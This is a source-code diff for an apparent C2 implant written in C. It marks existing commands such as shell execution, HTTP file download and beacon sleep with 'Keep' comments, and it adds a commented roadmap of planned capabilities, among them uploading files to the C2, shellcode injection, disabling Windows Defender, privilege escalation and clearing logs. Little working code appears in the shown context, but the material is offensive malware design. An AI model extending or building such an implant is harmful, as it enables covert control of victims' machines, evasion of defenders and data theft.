@@ -73,7 +73,7 @@ int parse_command(char* command, char* args, OutboundJsonDataStruct* response_st
 // Commands
 // ====================
 
-// user based commands
+// Keep
 void get_username(OutboundJsonDataStruct* response_struct)
 {
     /*
@@ -103,6 +103,7 @@ void get_username(OutboundJsonDataStruct* response_struct)
     }
 }
 
+// Keep
 void start_process(OutboundJsonDataStruct* response_struct) { };
 /*
     Command: start-process some.exe or execute
@@ -111,6 +112,7 @@ void start_process(OutboundJsonDataStruct* response_struct) { };
 
 */
 
+// Keep
 void get_file_http(OutboundJsonDataStruct* response_struct, char* args)
 {
     /*
@@ -148,6 +150,7 @@ void get_file_http(OutboundJsonDataStruct* response_struct, char* args)
     response_struct->command_result_data = "Successfuly downloaded file";
 }
 
+// Keep
 void shell(OutboundJsonDataStruct* response_struct, char* args)
 {
     /*
@@ -260,6 +263,7 @@ void shell(OutboundJsonDataStruct* response_struct, char* args)
     WhisperCloseHandle(hRead);
 }
 
+// Keep
 void messagebox(OutboundJsonDataStruct* response_struct, char* args) {
     char* context = NULL; // Required for strtok_s & thread safety.
     char* title = strtok_s(args, " ", &context);
@@ -276,6 +280,7 @@ void messagebox(OutboundJsonDataStruct* response_struct, char* args) {
     response_struct->command_result_data = "Message box popped successfully";
 }
 
+// Keep
 void sleep(OutboundJsonDataStruct* response_struct, char* args) {
     char* context = NULL; // Required for strtok_s & thread safety.
     char* sleep_arg = strtok_s(args, " ", &context);
@@ -301,6 +306,8 @@ void sleep(OutboundJsonDataStruct* response_struct, char* args) {
     response_struct->command_result_data = "Sleep set successfully";
     return;
 }
+
+// Keep
 void help(OutboundJsonDataStruct* response_struct)
 {
     const char* help_string = "Help:\n\
@@ -319,5 +326,61 @@ void help(OutboundJsonDataStruct* response_struct)
     return;
 }
 
+
+/*
+ Stub commands for things that can to be added for more functionality
+
+*/
+
+// File Operations
+// void write_file(response_struct, path, contents) - Write contents to a file
+// void read_file(response_struct, path) - Read contents of a file
+// void delete_file(response_struct, path) - Delete a file
+// void append_file(response_struct, path, contents) - Append data to an existing file
+// void rename_file(response_struct, old_path, new_path) - Rename or move a file
+// void copy_file(response_struct, src, dest) - Copy a file from one location to another
+// void download_file(response_struct, url, dest) - Download a file from a URL
+// void upload_file(response_struct, src, dest) - Upload a file to the C2
+// void search_file(response_struct, dir, pattern) - Search for files matching a wildcard pattern
+
+// Directory Operations
+// void mkdir(response_struct, path) - Create a directory
+// void rmdir(response_struct, path) - Remove a directory
+// void cd(response_struct, path) - Change directory
+// void pwd(response_struct) - Get current working directory
+// void ls(response_struct, path) - List files in a directory
+
+// Process and Execution
+// void start_process(response_struct, command) - Start a new process
+// void kill_process(response_struct, pid) - Kill a process by PID
+// void suspend_process(response_struct, pid) - Suspend a process
+// void resume_process(response_struct, pid) - Resume a suspended process
+// void shell(response_struct, command) - Execute a shell command and return output
+
+// System Information
+// void get_username(response_struct) - Get the current username
+// void get_system_info(response_struct) - Retrieve system information
+// void get_os_version(response_struct) - Get OS version details
+// void get_ip(response_struct) - Retrieve the system’s IP address
+// void get_env_vars(response_struct) - Get a list of environment variables
+
+// Network Operations
+// void get_file_http(response_struct, url) - Fetch a file over HTTP
+// void upload_file_http(response_struct, src, url) - Upload a file via HTTP POST
+// void ping(response_struct, target) - Send a ping to a target host
+// void port_scan(response_struct, target, start_port, end_port) - Scan open ports on a target
+
+// C2 Interaction
+// void sleep(response_struct, seconds) - Pause execution for a given time
+// void checkin(response_struct) - Send a beacon/check-in message to C2
+// void change_c2_server(response_struct, new_address) - Update the C2 server address
+
+// Stealth & Evasion
+// void inject_shellcode(response_struct, pid, shellcode) - Inject shellcode into a process
+// void hide_process(response_struct, pid) - Attempt to hide a running process
+// void disable_defender(response_struct) - Try to disable Windows Defender
+// void elevate_privileges(response_struct) - Attempt to escalate privileges
+// void clear_logs(response_struct) - Clear system logs for stealth
+// void disable_event_logging(response_struct) - Disable Windows event logging
 
 
